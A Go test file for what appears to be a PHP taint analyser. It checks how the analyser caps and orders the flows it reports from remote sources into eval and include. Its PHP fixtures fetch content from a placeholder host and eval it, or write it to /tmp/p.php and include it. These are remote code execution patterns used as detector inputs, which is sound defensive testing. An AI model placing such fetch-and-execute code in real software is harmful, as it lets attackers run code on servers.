package phptaint

import (
	"context"
	"fmt"
	"strings"
	"testing"
)

func TestEvidenceCapPreservesEqualConfidenceEndpoints(t *testing.T) {
	var src strings.Builder
	src.WriteString("<?php ")
	for i := 0; i < MaxEvidenceResults; i++ {
		fmt.Fprintf(&src, "function a%d() { return file_get_contents('https://example.invalid/p'); } eval(a%d());", i, i)
	}
	src.WriteString("function z() { return curl_exec($c); } eval(z());")
	r := Analyze(context.Background(), []byte(src.String()))
	if r.Status != StatusAnalyzed || r.TotalResults != MaxEvidenceResults+1 || len(r.Results) != MaxEvidenceResults || !r.EvidenceTruncated {
		t.Fatalf("report = %+v, want capped analyzed flows", r)
	}
	for i, result := range r.Results {
		if result.Source != fmt.Sprintf("a%d", i) || result.Sink != "eval" || result.Confidence != ConfidenceHigh {
			t.Errorf("result %d = %+v, want a%d -> eval at High", i, result, i)
		}
	}
}

func TestWrittenEvidencePreservesEqualConfidenceEndpoint(t *testing.T) {
	src := []byte(`<?php
file_put_contents('/tmp/p.php', file_get_contents('https://example.invalid/p'));
file_put_contents('/tmp/p.php', curl_exec($c));
include '/tmp/p.php';`)
	r := Analyze(context.Background(), src)
	if r.Status != StatusAnalyzed || r.TotalResults != 1 || len(r.Results) != 1 {
		t.Fatalf("report = %+v, want one analyzed flow", r)
	}
	got := r.Results[0]
	if got.Source != "file_get_contents" || got.Sink != "include" || got.Confidence != ConfidenceHigh {
		t.Fatalf("result = %+v, want file_get_contents -> include at High", got)
	}
}
